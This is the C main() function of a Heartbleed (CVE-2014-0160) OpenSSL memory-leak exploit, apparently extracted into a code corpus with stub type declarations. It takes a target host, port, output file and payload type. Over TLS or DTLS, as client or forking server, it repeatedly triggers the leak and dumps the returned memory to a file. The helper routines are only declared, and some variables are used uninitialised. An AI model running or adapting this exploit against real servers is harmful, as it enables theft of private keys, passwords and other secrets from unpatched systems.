
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_10__ TYPE_1__ ;


struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
struct option {char* member_0; int member_1; char member_3; int member_2; } ;
struct hostent {int dummy; } ;
typedef int socklen_t ;
typedef int peer ;
struct TYPE_10__ {int socket; int sslHandle; } ;
typedef TYPE_1__ connection ;


 int SSL_free (int ) ;
 int SSL_shutdown (int ) ;
 int accept (int,int ,int ) ;
 int atoi (char*) ;
 int close (int) ;
 TYPE_1__* dtls_client (int,char*,int) ;
 TYPE_1__* dtls_server (int,char*,int) ;
 int dtlsheartbleed (TYPE_1__*,int) ;
 int dtlssneakyleaky (TYPE_1__*,char*,int) ;
 int exit (int) ;
 scalar_t__ first ;
 int fork () ;
 struct hostent* gethostbyname (char*) ;
 int getopt_long (int,char**,char*,struct option*,int*) ;
 int heartbleed (TYPE_1__*,int) ;
 char* malloc (int) ;
 char* optarg ;
 int pre_cmd (int,int,int) ;
 int printf (char*,...) ;
 scalar_t__ recvfrom (int ,char*,int,int ,struct sockaddr*,int*) ;
 int repeat ;
 int sneakyleaky (TYPE_1__*,char*,int) ;
 int sprintf (char*,char*,char*) ;
 int ssl_init () ;
 int strlen (char*) ;
 int tcp_bind (char*,int) ;
 int tcp_connect (char*,int) ;
 TYPE_1__* tls_bind (int) ;
 TYPE_1__* tls_connect (int) ;
 int usage () ;

int main(int argc, char* argv[]){
 int ret, port, userc, index;
 int type = 1, udp = 0, verbose = 0, bind = 0, precmd = 9;
 int loop = 0;
 struct hostent *h;
 connection* c;
 char *host, *file;
 int ihost = 0, iport = 0, ifile = 0, itype = 0, iprecmd = 0;
 printf("[ heartbleed - CVE-2014-0160 - OpenSSL information leak exploit\n");
 printf("[ =============================================================\n");
        static struct option options[] = {
         {"server", 1, 0, 's'},
         {"port", 1, 0, 'p'},
  {"file", 1, 0, 'f'},
  {"type", 1, 0, 't'},
  {"bind", 1, 0, 'b'},
  {"verbose", 0, 0, 'v'},
  {"precmd", 1, 0, 'c'},
  {"loop", 0, 0, 'l'},
  {"help", 0, 0,'h'},
  {"udp", 0, 0, 'u'}
        };
 while(userc != -1) {
         userc = getopt_long(argc,argv,"s:p:f:t:b:c:lvhu",options,&index);
         switch(userc) {
                 case -1:
                         break;
                 case 's':
    if(ihost==0){
     ihost = 1;
     h = gethostbyname(optarg);
     if(h==((void*)0)){
      printf("[!] FATAL: unknown host '%s'\n",optarg);
      exit(1);
     }
     host = malloc(strlen(optarg) + 1);
     if(host==((void*)0)){
                    printf("[ error in malloc()\n");
                    exit(0);
            }
     sprintf(host,"%s",optarg);
                  }
    break;
                 case 'p':
    if(iport==0){
     port = atoi(optarg);
     iport = 1;
    }
                         break;
   case 'f':
    if(ifile==0){
     file = malloc(strlen(optarg) + 1);
     if(file==((void*)0)){
                    printf("[ error in malloc()\n");
                    exit(0);
            }
     sprintf(file,"%s",optarg);
     ifile = 1;
    }
    break;
   case 't':
    if(itype==0){
     type = atoi(optarg);
     itype = 1;
    }
    break;
   case 'h':
    usage();
    break;
   case 'b':
    if(ihost==0){
     ihost = 1;
     host = malloc(strlen(optarg)+1);
     if(host==((void*)0)){
                     printf("[ error in malloc()\n");
                    exit(0);
            }
     sprintf(host,"%s",optarg);
     bind = 1;
    }
    break;
   case 'c':
    if(iprecmd == 0){
     iprecmd = 1;
     precmd = atoi(optarg);
    }
    break;
   case 'v':
    verbose = 1;
    break;
   case 'l':
    loop = 1;
    break;
                 case 'u':
    udp = 1;
    break;

   default:
    break;
  }
 }
 if(ihost==0||iport==0||ifile==0||itype==0){
  printf("[ try --help\n");
  exit(0);
 }
 ssl_init();
 if(bind==0){
  if (udp){
   c = dtls_client(ret, host, port);
   dtlsheartbleed(c, type);
   dtlssneakyleaky(c,file,verbose);
   while(repeat==1){
    dtlssneakyleaky(c,file,verbose);
   }
   while(loop==1){
    printf("[ entered heartbleed loop\n");
    first=0;
    repeat=1;
    dtlsheartbleed(c,type);
    while(repeat==1){
     dtlssneakyleaky(c,file,verbose);
    }
   }
  }
  else {
   ret = tcp_connect(host, port);
   pre_cmd(ret, precmd, verbose);
   c = tls_connect(ret);
   heartbleed(c,type);
   while(repeat==1){
    sneakyleaky(c,file,verbose);
   }
   while(loop==1){
    printf("[ entered heartbleed loop\n");
    first=0;
    repeat=1;
    heartbleed(c,type);
    while(repeat==1){
     sneakyleaky(c,file,verbose);
    }
   }
  }

  SSL_shutdown(c->sslHandle);
  close (ret);
  SSL_free(c->sslHandle);
 }
 else{
  int sd, pid, i;
  if (udp) {
   c = dtls_server(sd, host, port);
   while (1) {
    char * bytes = malloc(1024);
    struct sockaddr_in peer;
    socklen_t len = sizeof(peer);
     if (recvfrom(c->socket,bytes,1023,0,(struct sockaddr *)&peer,&len) > 0) {
     dtlsheartbleed(c,type);
     dtlssneakyleaky(c,file,verbose);
      while(loop==1){
       printf("[ entered heartbleed loop\n");
       first=0;
       repeat=0;
       dtlsheartbleed(c,type);
       while(repeat==1){
        dtlssneakyleaky(c,file,verbose);
       }
      }
     }
   }
  }
  else {
   ret = tcp_bind(host, port);
   while(1){
          sd=accept(ret,0,0);
    if(sd==-1){
     printf("[!] FATAL: problem with accept()\n");
     exit(0);
    }
    if(pid=fork()){
     close(sd);
    }
          else{
     c = tls_bind(sd);
     pre_cmd(ret, precmd, verbose);
     heartbleed(c,type);
     while(repeat==1){
      sneakyleaky(c,file,verbose);
     }
     while(loop==1){
      printf("[ entered heartbleed loop\n");
      first=0;
      repeat=0;
      heartbleed(c,type);
      while(repeat==1){
       sneakyleaky(c,file,verbose);
      }
     }
     printf("[ done.\n");
     exit(0);
    }
   }
  }
 }
}
